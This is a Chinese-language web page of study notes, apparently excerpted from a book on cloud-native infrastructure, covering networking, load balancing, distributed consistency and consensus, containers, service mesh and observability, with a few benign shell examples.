<li>RTprop (Round-Trip propagation time，两个节点之间最小时延)：该值取决于物理距离，距离越长，时延越大。</li>
<li>BtlBw（Bottleneck Bandwidth，瓶颈带宽）：如果把网络链路想象成水管，RTprop 是水管的长度，BtlBw 则是水管最窄处的直径。</li>
<li>BDP（Bandwidth-Delay Product，带宽、时延的乘积）：它代表了网络上能够同时容纳的数据量（水管中有多少流动的水）。 BDP 的计算公式是：BDP = 带宽 × 时延。其中，带宽以比特每秒（bps）为单位，时延以秒为单位。</li>
<li>inflight 数据：指已经发送出去但尚未收到确认的数据包。这些数据包仍在网络中传输，等待接收方的处理或确认。</li>
</ul>
<h2 id="QUIC-设计原理与实践"><a href="#QUIC-设计原理与实践" class="headerlink" title="QUIC 设计原理与实践"></a>QUIC 设计原理与实践</h2><p>QUIC（Quick UDP Internet Connection，快速 UDP 网络连接）是一种基于 UDP 封装的安全可靠传输协议，旨在取代 TCP，成为新一代互联网的主流传输协议。</p>
<h1 id="第三章：深入-Linux-内核网络技术"><a href="#第三章：深入-Linux-内核网络技术" class="headerlink" title="第三章：深入 Linux 内核网络技术"></a>第三章：深入 Linux 内核网络技术</h1><h2 id="Linux-内核网络框架"><a href="#Linux-内核网络框架" class="headerlink" title="Linux 内核网络框架"></a>Linux 内核网络框架</h2><p>从 Linux 内核 2.4 版本开始，内核引入了一套通用的过滤框架 —— Netfilter，允许外界对网络数据包在内核协议栈流转过程中进行代码干预。</p>
<p>Linux 系统中的各类网络功能，如地址转换、封包处理、地址伪装、协议连接跟踪、数据包过滤、透明代理、带宽限速和访问控制等，都是基于 Netfilter 提供的代码拦截机制实现的。可以说，Netfilter 是整个 Linux 网络系统最重要（没有之一）的基石。</p>
<h2 id="内核旁路技术"><a href="#内核旁路技术" class="headerlink" title="内核旁路技术"></a>内核旁路技术</h2><p>对于网络密集型应用，内核态与用户态的频繁切换、复杂的网络协议栈处理，常常使 Linux 内核成为性能瓶颈。</p>
<p>在人们想办法提升 Linux 内核性能的同时，另外一批人抱着它不行就绕开它想法，提出了一种“内核旁路“（Kernel bypass）思想的技术方案。其中，DPDK 和 XDP 是主机内“内核旁路”思想的代表技术，RDMA 是主机之间“内核旁路”思想的代表技术。</p>
<h2 id="Linux-网络虚拟化"><a href="#Linux-网络虚拟化" class="headerlink" title="Linux 网络虚拟化"></a>Linux 网络虚拟化</h2><h3 id="虚拟网络通信技术"><a href="#虚拟网络通信技术" class="headerlink" title="虚拟网络通信技术"></a>虚拟网络通信技术</h3><blockquote>
<p>基于物理设备实现的网络拓扑结构是相对固定的，很难跟得上云原生时代下系统频繁变动的频率。例如，容器的动态扩缩容、集群跨数据中心迁移等等，都要求网络拓扑随时做出调整。正因为如此，软件定义网络（Software Defined Networking，SDN）的需求变得前所未有的迫切。</p>
</blockquote>
<blockquote>
<p>SDN 思想的核心是，在现有的物理网络之上新增一层虚拟网络，将控制平面（操作系统和各类网络控制软件等）和数据平面（底层通信的物理设备，以及各类通信协议等）解耦，将网络服务从底层硬件设备中抽象出来，由代码直接编程控制。</p>
</blockquote>
<blockquote>
<p>SDN 网络模型如图 3-16 所示：</p>
</blockquote>
<ul>
<li>位于下层的网络称 Underlay 网络，它是由路由器、交换机等硬件设备互联而成的物理网络，负责网络之间的数据传输；</li>
<li>位于上层的网络称 Overlay 网络，它是采用多种网络虚拟化技术在 Underlay 网络之上创建的虚拟网络。</li>
</ul>
<h1 id="第四章：负载均衡与代理技术"><a href="#第四章：负载均衡与代理技术" class="headerlink" title="第四章：负载均衡与代理技术"></a>第四章：负载均衡与代理技术</h1><h2 id="负载均衡与代理"><a href="#负载均衡与代理" class="headerlink" title="负载均衡与代理"></a>负载均衡与代理</h2><p>从处理请求的网络层次角度看，所有的负载均衡器可归纳为两大类：四层负载均衡和七层负载均衡，分别对应 OSI 模型的第四层（传输层）和第七层（应用层）。</p>
<p>“四层负载均衡”并非严格限定于 OSI 模型的第四层（传输层）。实际上，它的工作模式涉及多个网络层次：</p>
<ul>
<li>第二层（数据链路层）：通过修改帧头中的 MAC 地址，将请求从一个物理网络节点转发到另一个节点。这种方式通常用于同一广播域内的转发，例如交换机或桥接设备完成的二层转发操作。</li>
<li>第三层（网络层）：通过修改 IP 地址，实现跨子网的请求路由和转发。这是路由器的核心功能，通过修改数据包的源或目的 IP 地址，实现子网之间的通信和流量转发。</li>
<li>第四层（传输层）：通过修改 TCP/UDP 端口号或连接的目标地址，利用网络地址转换（NAT）技术隐藏内部网络结构，将请求从一个入口转发至多个后端服务。</li>
</ul>
<p>七层负载均衡器工作在应用层，这意味着负载均衡器必须与后端服务器建立新的传输层连接，并将客户端的请求代理到后端服务器。</p>
<p>七层负载均衡器工作在应用层，因此能够检测和处理请求内容，包括：</p>
<ul>
<li>安全层 TLS 协议：TLS 的归属层次在网络领域存在争议，本文为便于讨论假设属于应用层。</li>
<li>物理 HTTP 协议：涵盖 HTTP/1、HTTP/2、HTTP/3 等版本。</li>
<li>逻辑 HTTP 协议：包括请求的头部、主体和尾部数据。</li>
<li>消息协议：如 gRPC、RESTful API、SOAP、AMQP、MQTT 等。</li>
</ul>
<h2 id="负载均衡部署拓扑"><a href="#负载均衡部署拓扑" class="headerlink" title="负载均衡部署拓扑"></a>负载均衡部署拓扑</h2><h2 id="四层负载均衡技术"><a href="#四层负载均衡技术" class="headerlink" title="四层负载均衡技术"></a>四层负载均衡技术</h2><p>四层负载均衡器的典型代表是 LVS（Linux Virtual Server，Linux 虚拟服务器），由中国程序员章文嵩于 1998 年发起和开发。</p>
<h1 id="第五章：数据一致性与分布式事务"><a href="#第五章：数据一致性与分布式事务" class="headerlink" title="第五章：数据一致性与分布式事务"></a>第五章：数据一致性与分布式事务</h1><h2 id="数据一致性"><a href="#数据一致性" class="headerlink" title="数据一致性"></a>数据一致性</h2><p>引入事务的目的，是为了保证数据的“一致性”（Consistency）。</p>
<p>这里的一致性指的是，对数据有特定的预期状态，任何数据更改操作必须满足这些状态约束（或者恒等条件）。</p>
<p>想要达成数据的一致性，需要 3 个方面的努力：</p>
<ul>
<li>原子性（Atomic）：“原子”通常指不可分解为更小粒度的东西。这里原子性描述的是，客户端发起一个请求（请求包含多个操作）在异常情况下的行为。例如，只完成了一部分写入操作，系统出现故障了（进程崩溃、网络中断、节点宕机）。把多个操作纳入到一个原子事务，万一出现上述故障导致无法完成最终提交时，则中止事务，丢弃或者撤销那些局部修改。</li>
<li>隔离性（Isolation）： 同时运行的事务不应互相干扰。例如，当一个事务执行多次写入操作时，其他事务应仅能观察到该事务的最终完成结果，而非中间状态。隔离性旨在防止多个事务交叉操作导致的数据不一致问题。</li>
<li>持久性（Durability）：事务处理完成后，对数据的修改应当是永久性的，即使系统发生故障也不会丢失。在单节点数据库中，持久性意味着数据已写入存储设备（如硬盘或 SSD）。而在分布式数据库中，持久性要求数据成功复制到多个节点。为确保持久性，数据库必须在完成数据复制后，才能确认事务已成功提交。</li>
</ul>
<p>这也就是常说的事务的“ACID 特性”。值得一提的是，对于一致性而言，更多的是指数据在应用层的外部表现。应用程序借助数据库提供的原子性、隔离性和持久性，来实现一致性目标。也就是说，A、I、D 是手段，C（Consistency）是 3 者协作的目标，弄到一块完全是为了读起来更顺口。</p>
<h2 id="一致性与可用性的权衡"><a href="#一致性与可用性的权衡" class="headerlink" title="一致性与可用性的权衡"></a>一致性与可用性的权衡</h2><p>CAP 是一致性与可用性权衡的理论，是理解分布式系统的起点。</p>
<p>1999 年，美国工程院院士 Eric A.Brewer 发表了论文《Harvest, Yield, and Scalable Tolerant Systems》[1] ，首次提出了“CAP 原理”（CAP Principle）。不过，彼时的 CAP 仅是一种猜想，尚未得到理论上的证明。2002 年，麻省理工学院的 Seth Gilbert 和 Nancy Lynch 用严谨的数学推理证明了 CAP 的正确性。此后，CAP 从原理转变成定理，在分布式系统领域产生了深远的影响。</p>
<p>CAP 定理描述的是一个分布式系统中，涉及共享数据问题时，以下三个特性最多只能满足两个。</p>
<ul>
<li>一致性（Consistency）：意味着数据在任何时刻、任何节点上看到的都是符合预期的。为了确保定义的严谨性，学术研究中通常将一致性定义为“强一致性”（Strong Consistency），也称为“线性一致性”（Linearizability）。</li>
<li>可用性（Availability）：可用性代表系统持续提供服务的能力。要理解可用性，首先需要了解两个密切相关的指标：可靠性（Reliability）和可维护性（Serviceability）。可靠性通过平均无故障时间（MTBF, Mean Time Between Failure）度量；可维护性通过平均修复时间（MTTR, Mean Time To Repair）度量。可用性衡量系统在总时间内可以正常使用的时间比例，计算公式为 A = MTBF / (MTBF + MTTR)。因此，可用性是通过可靠性和可维护性计算得出的比例。例如，99.9999% 的可用性意味着平均每年系统故障修复时间为 32 秒。</li>
<li>分区容错性（Partition tolerance）：当部分节点由于网络故障或通信中断而无法相互联系，形成“网络分区”时，系统仍能够继续正确地提供服务。</li>
</ul>
<p>由于 CAP 定理已有严格的证明，我们不再探讨为何 CAP 不可兼得，直接分析舍弃 C、A、P 时所带来的不同影响。</p>
<ul>
<li>放弃分区容忍性（CA without P）：意味着我们将假设节点之间通信永远可靠。永远可靠的通信在分布式系统中必定不成立，只要依赖网络共享数据，分区现象就不可避免地存在。如果没有 P（分区容错性），也就谈不上是真正的分布式系统。</li>
<li>放弃可用性（CP without A）：意味着我们将假设一旦网络发生分区，节点之间的信息同步时间可以无限制延长。在现实中，选择放弃可用性系统（又称为 CP 系统）适用于对数据一致性有严格要求的场景，如金融系统、库存管理系统等。这些应用场景中，数据的一致性和准确性通常比系统的可用性更为重要。</li>
<li>放弃一致性（AP without C）：意味着在网络分区发生时，节点之间的数据可能会出现不一致。这种情况下，系统会优先保证可用性，而不是一致性。选择放弃一致性系统（又称 AP 系统）已经成为设计分布式系统的主流选择，因为分区容错性（P）是分布式网络的固有属性，不可避免；而可用性（A）通常是建设分布式系统的目标。如果系统在节点数量增加时可用性降低，则其分布式设计的价值也会受到质疑。除了像银行和证券这样的金融交易服务，这些场景中数据一致性至关重要，通常需要保证一致性而可能接受部分中断之外，大多数系统更倾向于在节点增多时保持高可用性，而不是牺牲可用性以维持一致性。</li>
</ul>
<blockquote>
<p>对于分布式系统而言，必须实现分区容错性（P）。因此，CAP 定理实际上要求在可用性（A）和一致性（C）之间选择，即在 AP 和 CP 之间权衡取舍。</p>
</blockquote>
<blockquote>
<p>工程师们又重新给一致性下了定义，将 CAP、ACID 中讨论的一致性（C）称为“强一致性”，而把牺牲了 C 的 AP 系统但又要尽可能获得正确结果的行为称为追求“弱一致性”。不过，若只是单纯地谈论“弱一致性”，通常意味着不保证一致性。在弱一致性中，工程师们进一步总结出了一种较强的特例，称为“最终一致性”（Eventual Consistency），它由 eBay 的系统架构师 Dan Pritchett 在 BASE 理论中提出。</p>
</blockquote>
<h2 id="分布式事务模型"><a href="#分布式事务模型" class="headerlink" title="分布式事务模型"></a>分布式事务模型</h2><h3 id="可靠事件队列"><a href="#可靠事件队列" class="headerlink" title="可靠事件队列"></a>可靠事件队列</h3><p>2008 年，eBay 架构师 Dan Pritchett 在 ACM 发表了论文《Base: An Acid Alternative》[1]。这篇论文中，作者基于实践总结出一种独立于 ACID 之外，通过消息队列和幂等机制来达成数据一致性的技术手段，并提出了“最终一致性”的概念。</p>
<p>BASE 是“Basically Available”、“Soft State”和“Eventually Consistent”的缩写，其核心理念为：</p>
<ul>
<li>基本可用（Basically Available）：系统保证在大多数情况下能够提供服务，即使某些节点出现故障时，仍尽可能保持可用性。这意味着系统优先保障可用性，而非一致性。</li>
<li>柔性状态（Soft state）：系统状态允许在一段时间内处于不一致状态。与 ACID 强一致性的要求不同，BASE 允许系统在更新过程处于“柔性”状态，即数据在某些节点上可以暂时不一致。</li>
<li>最终一致性（Eventually consistent）：最终一致性强调，即使在网络分区或系统故障的情况下，在经过足够的时间和多次数据同步操作后，所有节点的数据一定会一致。</li>
</ul>
<h2 id="服务幂等性设计"><a href="#服务幂等性设计" class="headerlink" title="服务幂等性设计"></a>服务幂等性设计</h2><p>幂等性是一个数学概念，后来被引入计算机科学中，用来描述某个操作可以安全地重试，即多次执行的结果与单次执行的结果完全一致。</p>
<h1 id="第六章：分布式共识及算法"><a href="#第六章：分布式共识及算法" class="headerlink" title="第六章：分布式共识及算法"></a>第六章：分布式共识及算法</h1><blockquote>
<p>世界上只有一种共识算法，就是 Paxos，其他所有的共识算法都是 Paxos 的退化版本。</p>
</blockquote>
<h2 id="什么是共识"><a href="#什么是共识" class="headerlink" title="什么是共识"></a>什么是共识</h2><p>尽管“共识”和“一致”在汉语中含义相近，但在计算机领域，这两个术语具有截然不同的含义：</p>
<ul>
<li>共识（Consensus）：指所有节点就某项操作（如选主、原子事务提交、日志复制、分布式锁管理等）达成一致的实现过程。</li>
<li>一致性（Consistency）：描述多个节点的数据是否保持一致，关注数据最终达到稳定状态的结果。</li>
</ul>
<blockquote>
<p>在分布式系统中，节点故障不可避免，但部分节点故障不应该影响系统整体状态。通过增加节点数量，依据“少数服从多数”原则，只要多数节点（至少  N/2+1 ）达成一致，其状态即可代表整个系统。这种依赖多数节点实现容错的机制称为 Quorum 机制。</p>
</blockquote>
<blockquote>
<p>Quorum 机制</p>
</blockquote>
<ul>
<li>3 节点集群：Quorum 为 2，允许 1 个节点故障；</li>
<li>4 节点集群：Quorum 为 3，允许 1 个节点故障；</li>
<li>5 节点集群：Quorum 为 3，允许 2 个节点故障。<blockquote>
<p>节点个数为 N 的集群，能容忍 (N−1)/2 个节点故障。你注意到了么？3 节点和 4 节点集群的故障容忍性一致。所以，一般情况下，以容错为目的的分布式系统没必要使用 4 个节点。</p>
</blockquote>
</li>
</ul>
<blockquote>
<p>根据上述的讨论，基于 Quorum 的机制，在不可靠的环境下，通过“少数服从多数”协商机制达成一致的决策，从而对外表现为一致的运行结果。这一过程被称为节点间的“协商共识”。</p>
</blockquote>
<blockquote>
<p>一旦解决共识问题，便可提供一套屏蔽内部复杂性的抽象机制，为应用层提供一致性保证，满足多种需求，例如：</p>
</blockquote>
<ul>
<li>主节点选举</li>
<li>原子事务提交</li>
<li>分布式锁管理</li>
<li>日志复制</li>
</ul>
<h2 id="Paxos-算法"><a href="#Paxos-算法" class="headerlink" title="Paxos 算法"></a>Paxos 算法</h2><blockquote>
<p>Paxos 算法由 Leslie Lamport[1] 于 1990 年提出，是一种基于消息传递、具备高度容错特性的共识算法，是当今分布式系统中最重要的理论基础，几乎就是“共识系统”的代名词。<br>Lamport 在分布式系统理论方面有非常多的成就，比如 Lamport 时钟、拜占庭将军问题、Paxos 算法等等。除了计算机领域之外，其他领域的无数科研工作者也要成天和 Lamport 开发的一套软件打交道，目前科研行业应用最广泛的论文排版系统 —— LaTeX (名字中的 La 就是指 Lamport)</p>
</blockquote>
<p>在 Paxos 算法中，节点分为三种角色：</p>
<ul>
<li>提议者（Proposer）：提议者是启动共识过程的节点，它提出一个值，请求其他节点对这个值进行投票，提出值的行为称为发起“提案”（Proposal），提案包含提案编号 (Proposal ID) 和提议的值 (Value)。注意的是，Paxos 算法是一个典型的为“操作转移”模型设计的算法，为简化表述，本文把提案类比成“变量赋值”操作，但你应该理解它是“操作日志”相似的概念，后面介绍的 Raft 算法中，直接就把“提案”称做“日志”了。</li>
<li>决策者（Acceptor）：接受或拒绝提议者发起的提案，如果一个提案被超过半数的决策者接受，意味着提案被“批准”（accepted）。提案一旦被批准，意味着在所有节点中达到共识，便不可改变、永久生效。</li>
<li>记录者（Learner）：记录者不发起提案，也不参与决策提案，它们学习、记录被批准的提案。</li>
</ul>
<h2 id="Raft-算法"><a href="#Raft-算法" class="headerlink" title="Raft 算法"></a>Raft 算法</h2><p>Paxos 算法中“节点众生平等”，每个节点都可以发起提案。多个提议者并行发起提案，是活锁、以及其他异常问题的源头。那如何不破坏 Paxos 的“节点众生平等”基本原则，又能在提案节点中实现主次之分，限制节点不受控的提案权利？</p>
<p>Raft 算法的设计机制是明确领导者、增加选举机制交接提案权利。Raft 算法中，节点分为以下三种角色：</p>
<ul>
<li>领导者（Leader）：负责处理所有客户端请求，将请求转换为“日志”复制到其他节点，不断地向所有节点广播心跳消息：“你们的领导还在，不要发起新的选举”。</li>
<li>跟随者（Follower）：接收、处理领导者的消息，并向领导者反馈日志的写入情况。当领导者心跳超时时，他会主动站起来，推荐自己成为候选人。</li>
<li>候选人（Candidate）：候选人属于过渡角色，他向所有的节点广播投票消息，如果他赢得多数选票，那么他将晋升为领导者；</li>
</ul>
<h1 id="第七章：容器编排技术"><a href="#第七章：容器编排技术" class="headerlink" title="第七章：容器编排技术"></a>第七章：容器编排技术</h1><blockquote>
<p>为了减轻管理容器的心智负担，实现容器调度、扩展、故障恢复等自动化机制，容器编排系统应运而生。过去十年间，Kubernetes 发展成为容器编排系统的事实标准，成为大数据分析、机器学习以及在线服务等领域广泛认可的最佳技术底座。</p>
<p>Kubernetes 在解决复杂问题的同时，本身也演变成当今最复杂的软件系统之一。目前，包括官方文档在内的大多数 Kubernetes 资料都聚焦于“怎么做”，鲜有解释“为什么这么做”。自 2015 年起，Google 陆续发布了《Borg, Omega, and Kubernetes》及《Large-scale cluster management at Google with Borg》等论文，分享了 Google 内部开发和运维 Borg、Omega 和 Kubernetes 系统的经验与教训。</p>
</blockquote>
<h2 id="容器编排系统的演进"><a href="#容器编排系统的演进" class="headerlink" title="容器编排系统的演进"></a>容器编排系统的演进</h2><blockquote>
<p>Google 先后设计了三套不同的容器管理系统，Borg、Omega 和 Kubernetes，并向外界分享了大量的设计思想、论文和源码，直接促进了容器技术的普及和发展，对整个行业的技术演进产生了深远的影响。</p>
</blockquote>
<blockquote>
<p>从 Borg 到 Kubernetes，容器技术的价值早已超越了单纯提升资源利用率。更深远的影响在于，系统开发和运维的理念从“以机器为中心”转变为“以应用为中心”：</p>
</blockquote>
<ul>
<li>容器封装了应用程序的运行环境，屏蔽了操作系统和硬件的细节，使得业务开发者不再需要关注底层实现；</li>
<li>基础设施团队可以更灵活地引入新硬件或升级操作系统，最大限度减少对线上应用和开发者的影响；</li>
<li>每个设计良好的容器通常代表一个应用，因此管理容器就等于管理应用，而非管理机器；</li>
<li>将收集的性能指标（如 CPU 使用率、内存用量、QPS 等）与应用程序而非物理机器关联，显著提高了应用监控的精确度和可观测性。</li>
</ul>
<h2 id="容器技术的原理与演进"><a href="#容器技术的原理与演进" class="headerlink" title="容器技术的原理与演进"></a>容器技术的原理与演进</h2><h3 id="文件系统隔离"><a href="#文件系统隔离" class="headerlink" title="文件系统隔离"></a>文件系统隔离</h3><blockquote>
<p>chroot 是“change root”的缩写，它允许管理员将进程的根目录锁定在特定位置，从而限制进程对文件系统的访问范围。chroot 的隔离功能对安全性至关重要。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ mkdir -p new-root&#x2F;&#123;bin,lib64,root&#125;</span><br><span class="line">$ cp &#x2F;bin&#x2F;bash new-root&#x2F;bin</span><br><span class="line">$ cp &#x2F;lib64&#x2F;&#123;ld-linux-x86-64.so*,libc.so*,libdl.so.2,libreadline.so*,libtinfo.so*&#125; new-root&#x2F;lib64</span><br><span class="line">$ sudo chroot new-root</span><br></pre></td></tr></table></figure>

<blockquote>
<p>除了 /bin 之外，如果我们将程序依赖的 /etc、/proc 等目录一同打包进去，实际上就得到了一个 rootfs 文件。因为 rootfs 包含的不仅是应用，还有整个操作系统的文件和目录，这意味着应用及其所有依赖都被封装在一起，这正是容器被广泛宣传为一致性解决方案的由来。</p>
</blockquote>
<h3 id="资源全方位隔离"><a href="#资源全方位隔离" class="headerlink" title="资源全方位隔离"></a>资源全方位隔离</h3><blockquote>
<p>从 Linux 内核 2.6.19 起，逐步引入了 UTS、IPC、PID、Network 和 User 等命名空间功能。到了 3.8 版本，Linux 实现了容器所需的六项最基本的资源隔离机制。Linux 4.6 版本起，新增了 Cgroup 和 Time 命名空间。</p>
</blockquote>
<h3 id="资源全方位限制"><a href="#资源全方位限制" class="headerlink" title="资源全方位限制"></a>资源全方位限制</h3><blockquote>
<p>进程的资源隔离已经完成，如果再对使用资源进行额度限制，就能对进程的运行环境实现“进乎完美”的隔离。这就要用 Linux 内核的第二项技术 —— Linux Control Cgroup（Linux 控制组群，简称 cgroups）。</p>
</blockquote>
<blockquote>
<p>cgroups 是 Linux 内核用于隔离、分配并限制进程组使用资源配额的机制。例如，它可以控制进程的 CPU 占用时间、内存大小、磁盘 I/O 速度等。</p>
</blockquote>
<h3 id="设计容器协作的方式"><a href="#设计容器协作的方式" class="headerlink" title="设计容器协作的方式"></a>设计容器协作的方式</h3><blockquote>
<p>登录到 Linux 机器后，执行 pstree -g 命令可以查看当前系统中的进程树状结构。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ pstree -g</span><br><span class="line">    |-rsyslogd(1089)-+-&#123;in:imklog&#125;(1089)</span><br><span class="line">    |  |-&#123;in:imuxsock) S 1(1089)</span><br><span class="line">    | &#96;-&#123;rs:main Q:Reg&#125;(1089)</span><br></pre></td></tr></table></figure>

<h3 id="超亲密容器组-Pod"><a href="#超亲密容器组-Pod" class="headerlink" title="超亲密容器组 Pod"></a>超亲密容器组 Pod</h3><blockquote>
<p>在 Kubernetes 中，与“进程组”对应的设计概念是 Pod。Pod 是一组紧密关联的容器集合，它们共享 IPC、Network 和 UTS 等命名空间，是 Kubernetes 管理的最基本单位。</p>
</blockquote>
<h2 id="容器镜像的原理与应用"><a href="#容器镜像的原理与应用" class="headerlink" title="容器镜像的原理与应用"></a>容器镜像的原理与应用</h2><blockquote>
<p>所谓的“容器镜像”，其实就是一个“特殊的压缩包”，它将应用及其依赖（包括操作系统中的库和配置）打包在一起，形成一个自包含的环境。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ docker build 镜像名称</span><br><span class="line"></span><br><span class="line">$ docker run 镜像名称</span><br></pre></td></tr></table></figure>

<blockquote>
<p>Docker 镜像利用联合文件系统的分层设计。整个镜像从下往上由 6 个层组成：</p>
</blockquote>
<ul>
<li>最底层是基础镜像 Debian Stretch，相当于“base rootfs”，所有容器可以共享这一层；</li>
<li>接下来的 3 层是通过 Dockerfile 中的 ADD、ENV、CMD 等指令生成的只读层；</li>
<li>Init Layer 位于只读层和可写层之间，存放可能会被修改的文件，如 /etc/hosts、/etc/resolv.conf 等。这些文件原本属于 Debian 镜像，但容器启动时，用户往往会写入一些指定的配置，因此 Docker 为其单独创建了这一层；</li>
<li>最上层是通过 CoW（写时复制）技术创建的可写层（Read/Write Layer）。</li>
</ul>
<blockquote>
<p>通过镜像分层设计，以 Docker 镜像为核心，不同公司和团队的开发人员可以紧密协作。每个人不仅可以发布基础镜像，还可以基于他人的基础镜像构建和发布自己的软件。镜像的增量操作使得拉取和推送内容也是增量的，这远比操作虚拟机动辄数 GB 的 ISO 镜像要更敏捷。</p>
</blockquote>
<h2 id="容器持久化存储设计"><a href="#容器持久化存储设计" class="headerlink" title="容器持久化存储设计"></a>容器持久化存储设计</h2><blockquote>
<p>Docker 通过将宿主机目录挂载到容器内部的方式，实现数据持久化存储。如图 7-21 所示，目前它支持三种挂载方式：bind mount、volume 和 tmpfs mount。</p>
</blockquote>
<h2 id="容器间通信的原理"><a href="#容器间通信的原理" class="headerlink" title="容器间通信的原理"></a>容器间通信的原理</h2><h2 id="资源弹性伸缩"><a href="#资源弹性伸缩" class="headerlink" title="资源弹性伸缩"></a>资源弹性伸缩</h2><h1 id="第八章：服务网格技术"><a href="#第八章：服务网格技术" class="headerlink" title="第八章：服务网格技术"></a>第八章：服务网格技术</h1><h2 id="什么是服务网格"><a href="#什么是服务网格" class="headerlink" title="什么是服务网格"></a>什么是服务网格</h2><blockquote>
<p>服务网格是一个处理服务通讯的专门的基础设施层。它的职责是在由云原生应用组成服务的复杂拓扑结构下进行可靠的请求传送。在实践中，它是一组和应用服务部署在一起的轻量级的网络代理，对应用服务透明。 </p>
<p>—— What’s a service mesh？And why do I need one?，William Morgan</p>
</blockquote>
<blockquote>
<p>服务网格是一个基础设施层，用于处理服务间通信。云原生应用有着复杂的服务拓扑，服务网格保证请求在这些拓扑中可靠地穿梭。在实际应用当中，服务网格通常是由一系列轻量级的网络代理组成的，它们与应用程序部署在一起，但对应用程序透明。</p>
</blockquote>
<h2 id="服务间通信的演化"><a href="#服务间通信的演化" class="headerlink" title="服务间通信的演化"></a>服务间通信的演化</h2><blockquote>
<p>实施微服务架构时，需要解决问题（服务注册、服务发现、负载均衡、熔断、限流等）的本质是保证服务间请求的可靠传递。站在业务的角度来看，无论上述逻辑设计的多么复杂，都不会影响业务请求本身的业务语义与业务内容发生任何变化，实施微服务架构的技术挑战和业务逻辑没有任何关系。</p>
</blockquote>
<blockquote>
<p>回顾前面提到的 TCP/IP 协议案例，我们思考是否服务间的通信是否也能像 TCP 协议栈那样：“人们基于 HTTP 协议开发复杂的应用，无需关心底层 TCP 协议如何控制数据包”。如果能把服务间通信剥离、并下沉到微服务基础层，工程师将不再浪费时间编写基础设施层的代码，而是将充沛的精力聚焦在业务逻辑上。</p>
</blockquote>
<blockquote>
<p>第一代服务网格由一系列独立运行的代理型服务（Sidecar）构成，但并没有思考如何系统化管理这些代理服务。为了提供统一的运维入口，服务网格继续演化出了集中式的控制面板（Control Plane）。</p>
</blockquote>
<blockquote>
<p>典型的第二代服务网格以 Google、IBM 和 Lyft 联合开发的 Istio 为代表。根据 Istio 的总体架构（见图 8-8），第二代服务网格由两大核心组成部分：一系列与微服务共同部署的边车代理（称为数据平面），以及用于管理这些代理的控制器（称为控制平面）。控制器向代理下发路由、熔断策略、服务发现等策略信息，代理根据这些策略处理服务间的请求。</p>
</blockquote>
<h2 id="数据平面的设计"><a href="#数据平面的设计" class="headerlink" title="数据平面的设计"></a>数据平面的设计</h2><h2 id="控制平面的设计"><a href="#控制平面的设计" class="headerlink" title="控制平面的设计"></a>控制平面的设计</h2><h1 id="第九章：系统可观测性"><a href="#第九章：系统可观测性" class="headerlink" title="第九章：系统可观测性"></a>第九章：系统可观测性</h1><h2 id="什么是可观测性"><a href="#什么是可观测性" class="headerlink" title="什么是可观测性"></a>什么是可观测性</h2><blockquote>
<p>遥测数据（telemetry data）是指采样和汇总有关软件系统性能和行为的数据，这些数据（接口的响应时间、请求错误率、服务资源消耗等）用于监控和了解系统的当前状态。</p>
</blockquote>
<blockquote>
<p>实际上，软件领域的观测与上述火箭发射系统相似，都是通过全面收集系统运行数据（遥测数据），以了解内部状态。因此，观测本质上是一种数据收集与分析的科学，旨在帮助解决复杂系统中的故障检测、性能优化和风险预警等问题。</p>
</blockquote>
<h2 id="可观测性与传统监控"><a href="#可观测性与传统监控" class="headerlink" title="可观测性与传统监控"></a>可观测性与传统监控</h2><blockquote>
<p>可观测性与监控的关系</p>
</blockquote>
<blockquote>
<p>监控告诉我们系统哪些部分是正常的，可观测性告诉我们系统为什么不正常了。</p>
</blockquote>
<blockquote>
<p>——by《高性能 MySQL》作者 Baron Schwartz</p>
</blockquote>
<h2 id="遥测数据的分类与处理"><a href="#遥测数据的分类与处理" class="headerlink" title="遥测数据的分类与处理"></a>遥测数据的分类与处理</h2><blockquote>
<p>业界将系统输出的数据总结为三种独立的类型，它们的含义与区别如下：</p>
</blockquote>
<ul>
<li><p>指标（metric）：量化系统性能和状态的“数据点”，每个数据点包含度量对象（如接口请求数）、度量值（如 100 次/秒）和发生的时间，多个时间上连续的数据点便可以分析系统性能的趋势和变化规律。指标是发现问题的起点，例如你半夜收到一条告警：“12 点 22 分，接口请求成功率下降到 10%”，这表明系统出现了问题。接着，你挣扎起床，分析链路追踪和日志数据，找到问题的根本原因并进行修复。</p>
</li>
<li><p>日志（log）：系统运行过程中，记录离散事件的文本数据。每条日志详细描述了事件操作对象、操作结果、操作时间等信息。例如下面的日志示例，包含了时间、日志级别（ERROR）以及事件描述。日志为问题诊断提供了精准的上下文信息，与指标形成互补。当系统故障时，“指标”告诉你应用程序出现了问题，“日志”则解释了问题出现的原因。</p>
</li>
<li><p>链路追踪（trace）：记录请求在多个服务之间的“调用链路”（Trace），以“追踪树”（Trace Tree）的形式呈现请求的“调用”（span）、耗时分布等信息。</p>
</li>
</ul>
<h3 id="指标的处理"><a href="#指标的处理" class="headerlink" title="指标的处理"></a>指标的处理</h3><blockquote>
<p>为便于理解和使用不同类型的指标，Prometheus 定义了四种指标类型：</p>
</blockquote>
<ul>
<li>计数器（Counter）：一种只增不减的指标类型，用于记录特定事件的发生次数。常用于统计请求次数、任务完成数量、错误发生次数等。在监控 Web 服务器时，可以使用 Counter 来记录 HTTP 请求的总数，通过观察这个指标的增长趋势，能了解系统的负载情况；</li>
<li>仪表盘（Gauge）：一种可以任意变化的指标，用于表示某个时刻的瞬时值。常用于监控系统的当前状态，如内存使用量、CPU 利用率、当前在线用户数等；</li>
<li>直方图（Histogram）：用于统计数据在不同区间的分布情况。它会将数据划分到多个预定义的桶（bucket）中，记录每个桶内数据的数量。常用于分析请求延迟、响应时间、数据大小等分布情况。比如监控服务响应时间时，Histogram 可以将响应时间划分到不同的桶中，如 0-100ms、100-200ms 等，通过观察各个桶中的数据分布，能快速定位响应时间的集中区间和异常情况；</li>
<li>摘要（Summary）：和直方图类似，摘要也是用于统计数据的分布情况，但与直方图不同的是，Summary 不能提供数据在各个具体区间的详细分布情况，更侧重于单一实例（例如单个服务实例）的数据进行计算。</li>
</ul>
<h3 id="日志的索引与存储"><a href="#日志的索引与存储" class="headerlink" title="日志的索引与存储"></a>日志的索引与存储</h3><blockquote>
<p>处理日志本来是件稀松平常的事情，但随着数据规模的增长，量变引发质变，高吞吐写入（GB/s）、低成本海量存储（PB 级别）以及亿级数据的实时检索（1 秒内），已成为软件工程领域最具挑战性的难题之一。</p>
</blockquote>
